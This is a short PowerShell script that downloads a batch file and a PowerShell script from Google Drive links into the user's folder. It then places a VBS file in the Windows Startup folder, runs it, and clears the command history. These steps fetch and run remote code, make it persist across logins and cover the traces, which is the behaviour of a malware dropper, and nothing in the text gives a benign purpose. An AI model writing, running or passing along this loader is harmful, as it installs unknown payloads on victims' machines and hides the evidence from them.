cd D:\Users\$Env:UserName
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1ZTZxvMinJVQJBwa4gRCxdGnz4eo_MUDv" -outfile "win64.bat"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=12qElj9lDxMST2t7EsKmljDDa6AR9h_JT" -outfile "user.ps1"
cd "D:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1mYikyVPT0uKA-PEIJwrpT9kdJY2P5H6l" -outfile "startup.vbs"
start startup.vbs
Clear-History
exit
